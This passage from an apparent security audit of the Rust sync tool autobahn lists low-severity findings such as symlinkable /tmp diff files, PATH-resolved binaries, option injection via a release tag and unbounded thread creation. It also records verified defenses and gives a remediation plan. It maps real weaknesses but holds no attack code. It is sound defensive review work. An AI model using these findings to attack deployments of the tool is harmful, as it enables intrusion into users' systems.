**Evidence.** `SessionLock::acquire` creates `sessions/<id>/lock` and takes
`flock(LOCK_EX|LOCK_NB)` with a 2 s retry window. Directory and file modes come from
the umask; status JSON is likewise unprotected.

**Impact.** Consent-based locking: any same-user process can unlink and recreate the
lock file to bypass it (same-user is out of scope), and world-readable session
status discloses paths/state on shared hosts. The lock does correctly prevent
*accidental* concurrent sessions, which is its stated purpose.

**Recommendation.** `0700` session directories, `0600` for state files.

---

### F19 — Relayed agent stderr is printed verbatim

- **Severity: LOW**
- **Location:** `src/transport/mod.rs:130-146`; consumed by `src/shop.rs` (`recent_log`)

**Evidence.** After the handshake, the agent's stderr lines are printed with a
`[host]` prefix, unchanged. A malicious agent can emit forged log lines and ANSI
escape sequences (including terminal-title/OSC sequences) that appear as the local
supervisor's own output.

**Recommendation.** Strip control characters (`\x1b`, `\r`) and cap line length
before relaying.

---

### F20 — Tray diff temp file name is predictable; notifier is resolved from `PATH`

- **Severity: LOW**
- **Location:** `src/tray.rs:733`, `:838-862`

**Evidence.**

```rust
.join(format!("autobahn-diff-{}.diff", path.replace('/', "_")))
```

The `/`→`_` substitution blocks traversal, and the name is derived from a conflict
path. `which_notifier()` walks `PATH` (plus Homebrew locations) to find
`terminal-notifier` and execs the first hit with title/body arguments.

**Impact.** The diff file can be pre-created or symlinked by a local user in shared
`/tmp` (clobbering an arbitrary writable path). The `PATH` lookup means a user whose
`PATH` contains an attacker-writable directory executes an attacker's
`terminal-notifier` — the values passed are tool-generated, so this is a benign but
unnecessary exposure.

**Recommendation.** Randomize the diff filename; prefer an absolute notifier path or
at least document the `PATH` reliance.

---

### F21 — `--version` tag passed into `gh` argv without `--`

- **Severity: LOW** (self-inflicted only)
- **Location:** `src/update.rs:641-649`

**Evidence.**

```rust
command.arg("release").arg("download");
if let Some(tag) = &self.tag { command.arg(tag); }   // a leading '-' reads as an option
command.args(["--repo", REPO, "--pattern", asset, "--output"])...
```

The `curl` branch is safe (the tag is embedded in a URL, passed as one argv element),
and the SSH paths use `--` correctly. The tag is typed by the same user.

**Recommendation.** Validate the tag against `^v?[A-Za-z0-9._-]+$` (and mirror it in
`install.sh`), or separate it with `--` if `gh` supports it.

---

### F22 — CI/release actions pinned to mutable tags

- **Severity: LOW**
- **Location:** `.github/workflows/ci.yml`, `.github/workflows/release.yml`

**Evidence.** `actions/*@v4`, `dtolnay/rust-toolchain@stable`, `Swatinem/rust-cache@v2`,
and `vmactions/freebsd-vm@v1` are all mutable tags. Untrusted-input handling is
otherwise clean: `github.event.*` appears only inside `if:` expressions via
`contains()` (never in `run:`), `run:` blocks interpolate only `matrix.*` and quoted
`$GITHUB_REF_NAME`/`$GITHUB_REPOSITORY`, secrets exist only in the `mac` job under
`environment: release` (approval-gated), the workflow triggers only on `push: tags`,
and credentials are cleaned in an `if: always()` step.

**Recommendation.** Pin third-party actions to full commit SHAs.

---

### F23 — `Response::Scan` snapshots are not structurally validated

- **Severity: LOW**
- **Location:** `src/endpoint/remote.rs:136-139` vs. the validated delta path at `:241-245`

**Evidence.** The delta arm runs `root.validate(false)` and rejects an invalid
hierarchy; the direct `Response::Scan(snapshot)` arm stores the snapshot unchanged.
Downstream defenses hold (`validate_path`/`validate_name`, `resolve_relative`,
`resolve_parent`), so no root escape was found — but separator-bearing or duplicate
child names enter the session model and the ancestor record unvalidated, and
`ScanUnchanged` can pin a false model.

**Recommendation.** Run `snapshot.root.validate(false)` on this arm too.

---

### F24 — Per-`Open` thread and endpoint creation is uncapped

- **Severity: LOW** (trusted-peer DoS)
- **Location:** `src/transport/mod.rs:438-458`

**Evidence.** Each `MuxRequest::Open` spawns a thread serving a channel with no
concurrency limit; duplicate channel ids are rejected (`:440-447`) and the
controller's router fails the connection on unsolicited responses
(`src/transport/mux.rs:163-180`). A controller (or attach-mode peer) flooding `Open`
frames allocates threads and endpoints without bound. `HELD_STDERR_LINES = 64` and
`PUSH_WINDOW = 4` bound the other buffers.

**Recommendation.** Cap concurrent channels per connection.

---

### Informational

- **I1 — `SymlinkMode::Raw` is the default** (`src/scan/mod.rs:163-174`): peer-chosen
  symlink targets are stored and created verbatim, so a link may point outside the
  root. Autobahn itself never dereferences them (`resolve_parent`,
  `verify_directory`), so this is a foot-gun for *other* tools that later walk the
  tree, not a break of autobahn's confinement. Consider defaulting to `Portable` for
  new sessions and documenting the choice.
- **I2 — Pushed peering configuration carries `agent_command`**
  (`src/peering.rs:533-536`), which followers execute as a process. This is broader
  than the sync-write channel (which is confined to configured roots): compromise of
  the alpha yields arbitrary command execution on every beta. Alert hooks are *not*
  carried (the follower's supervisor is built without `.with_alerts`,
  `src/supervisor/peer.rs:135-136`). Document the implication in `docs/peering.md`,
  or require explicit opt-in for `agent_command` in pushed groups.
- **I3 — `on_alert` is an arbitrary shell command by design**
  (`src/alerts.rs:486-500`) and inherits the caller's environment. Config author =
  code author, so no boundary is crossed; when `watch` runs in a terminal the hook
  sees the user's full environment (the login service sets only a sparse `PATH` and
  `AUTOBAHN_HOME`). Worth documenting.

---

## 4. Where the code is strong (verified, not assumed)

These were checked specifically because they are the places where a sync tool
usually fails; each holds.

| Control | Evidence |
|---|---|
| **Frame length is validated before allocation**, both directions, including the compressed and chunked paths | `src/transport/mod.rs:1204-1253` (checks before `vec![0u8; length]` and before `lz4_flex::block::decompress`), `:1072-1077` + `:1090` on send; regression test `an_oversized_length_prefix_is_refused_not_allocated` at `:1323-1337` |
| **Path traversal is rejected component-by-component** | `validate_path`/`validate_name` reject empty/`.`/`..`/`/`/NUL (`src/endpoint/local.rs:3039-3062`), applied before any filesystem contact (`:1857-1868`), re-applied to every child name (`:2124-2135`) |
| **Symlinks are never traversed during applies** | `resolve_parent` verifies every parent component with `symlink_metadata` (`:1882-1901`); removals refuse a swapped entry rather than recursing (`:2363-2365`) |
| **Mode bits are masked to `0o777`** — setuid/setgid/sticky cannot be propagated, including from the wire | `src/endpoint/local.rs:571-572`; `creation_mode` only derives execute from read (`:2673-2679`); defaults `0o700`/`0o600` |
| **Root deletion is refused twice** | session halt before any endpoint sees it (`src/session/mod.rs:651-658`) and a second refusal at the endpoint (`src/endpoint/local.rs:2345-2350`) |
| **Stale transitions are validated against the last scan** (digest + mtime/size/inode/mode) | `validate_file` (`src/endpoint/local.rs:1922-1970`); disagreements distrust the baseline for every session sharing the root |
| **Staged content is verified before publication** | `copy_verifying` digests while copying (`:2232-2241`), `staged_content_matches` re-hashes survivors (`:2218-2231`), and publication re-checks the staged entry with `fs::symlink_metadata` so a swapped/symlinked blob is not installed (`:2224, :2277`, exercised by the test at `:4969-4996`) |
| **Handshake pins exact version + compatibility epoch** | `verify_handshake` (`src/transport/mod.rs:964-983`), `COMPATIBILITY_EPOCH = 13` inside `protocol::version()` (`src/protocol.rs:285-291`); enforced both ends before traffic; failed handshakes reap the child (`src/transport/mux.rs:126-138`) |
| **Control socket IPC is properly authenticated** | socket `0600`, parent `0700`, `SO_PEERCRED`/`getpeereid` same-uid check *before* the first frame, 2 s I/O timeouts (`src/supervisor/control.rs:262-276, 300-336, 341-360`) |
| **Peering file pushes are allowlisted** | `is_pushable` accepts only `config.toml`, `name`, `ignores/<plain>`, `sessions/<plain>`; traversal tested (`src/peering.rs:236-263, 372-382`) |
| **SSH invocations use argv form and an option terminator** | `ssh_argv` inserts `--` before the host (`src/transport/mod.rs:284-296`), `ssh_command` likewise (`src/transport/install.rs:355-369`) — a hostile host string cannot become `ProxyCommand` |
| **Alert data reaches hooks only as environment/stdin, never interpolated into the command** | `src/alerts.rs:486-496`, `src/supervisor/mod.rs:2157-2184` |
| **Ignore patterns cannot escape** | `globset` with `literal_separator(true)`, root-relative matching, and no use of patterns to build filesystem paths (`src/scan/ignore.rs:56-209`) |
| **launchd plist XML escaping; tray AppleScript escaping** | `src/service.rs:186-190`; `src/tray.rs:786` |
| **Ownership resolution is reentrant and does not follow symlinks** | `getpwnam_r`/`getgrnam_r` with ERANGE growth (`src/ownership.rs:37-93`); `apply_ownership` uses `lchown` (`src/endpoint/local.rs:2333-2341`) |
| **Mux protocol misuse fails the connection** | unsolicited/duplicate responses error out (`src/transport/mux.rs:163-180`); stderr held lines capped at 64 (`src/transport/mod.rs:114`) |

---

## 5. Dependencies and build

- **Direct dependencies** (`Cargo.toml`): `anyhow`, `bincode 1.3`, `blake3`, `caseless`,
  `clap 4`, `globset 0.4`, `libc`, `lz4_flex 0.11`, `notify 6`, `serde`, `serde_json`,
  `thiserror`, `toml 0.8`, `unicode-normalization`, `tray-icon 0.24` (+ 8 elided).
- **`libc` is used for**: `flock`, `SO_PEERCRED`/`getpeereid`, `getpwnam_r`/`getgrnam_r`,
  `statfs`, `renamex_np`, `renameat2`, terminal control, `localtime_r`/`strftime`.
  The `unsafe` blocks were reviewed: they follow the documented patterns
  (null-checked `*_r` results, sized buffers, `zeroed()` structs passed immediately,
  `CString` for paths). No unchecked `from_utf8_unchecked`, `transmute`, or raw
  descriptor construction was found.
- **`lz4_flex 0.11`** is used with an explicit declared-decompressed-length check
  against the frame cap before decompression (`src/transport/mod.rs:1246-1254`), which
  is the right way to avoid decompression amplification.
- **`bincode 1.3.3`**: see F13 — no `with_limit`, though the slice reader's bounds
  check plus serde's cautious pre-allocation bound memory to bytes received.
- **No `cargo audit` / advisory-database run was performed** (no network tool run
  during this review). Dependency *versions* were read from `Cargo.lock`; known-CVE
  status is not asserted here. Recommend `cargo audit` (or `cargo deny`) in CI.
- **Pinning:** `Cargo.lock` is committed, and the release workflow builds from a tag
  and checks the tag against `Cargo.toml`'s version — good practice.
- **`AUTOBAHN_SSH`, `AUTOBAHN_AGENTS_DIR`, `AUTOBAHN_PEERING_ATTACH`, `AUTOBAHN_LOG`,
  `AUTOBAHN_HOME`, `AUTOBAHN_BIN_DIR`/`AUTOBAHN_PREFIX`** are environment-controlled
  overrides. They are treated as same-user customization hooks (documented as such
  for `AUTOBAHN_SSH`). Note that `AUTOBAHN_HOME` movement is honoured by both the
  installer and the binary, so the two agree.

---

## 6. Prioritized remediation

1. **Validate peer-supplied identifiers before they become paths or allocations.**
   `Initialize.session`/`side` (F2) and `ScanDelta.length` (F1). These are the two
   findings where a remote peer reaches `remove_dir_all` and an unbounded allocation
   respectively; both fixes are small and local.
2. **Never interpolate scan-derived names into a suggested shell command** (F3), and
   quote remote-derived filenames in the prune script (F4).
3. **Close the release-integrity gap**: verify the agent bundle in `install.sh` (F7)
   and sign `SHA256SUMS` from an independent channel, verifying it in both installers
   (F8).
4. **Harden the peering attach socket** (F5) to the same standard as the control
   socket, and fix the `/tmp` fallback ownership handling (F6).
5. **Escape the shipped example hook** (F9) and treat the `inside-root` staging path
   as untrusted (F10).
6. Then the LOW/INFO set: systemd escaping (F11), message-size and channel caps
   (F12, F24), randomized temporaries (F16), state/config permissions (F17, F18),
   log sanitization (F19), action pinning (F22), snapshot validation (F23).

---

## 7. Method and limitations

- Static reading of the working tree with targeted greps for command execution,
  `unsafe`, privilege operations, deserialization, and path handling; four parallel
  module deep-dives (protocol/remote boundary, filesystem write path,
  config/CLI/updater/installer, supervisor/IPC/alerts) whose findings were spot-checked
  against the source and whose line references are reproduced above.
- **Not performed:** dynamic testing, fuzzing beyond the repository's own existing
  adversarial frame tests, network-level testing, a dependency CVE scan, and review
  of `apps/macos/`, `bench/`, and the benchmark harness (out of the security scope).
- **`[INFERENCE]`** marks claims that follow from reading code but were not executed:
  specific reachability of error text into F9's environment, the session-layer callers
  of F15, and exploitability estimates that depend on a host's umask or filesystem.
- Where a finding's severity depends on a precondition, the precondition is stated in
  the finding rather than buried in the rating.
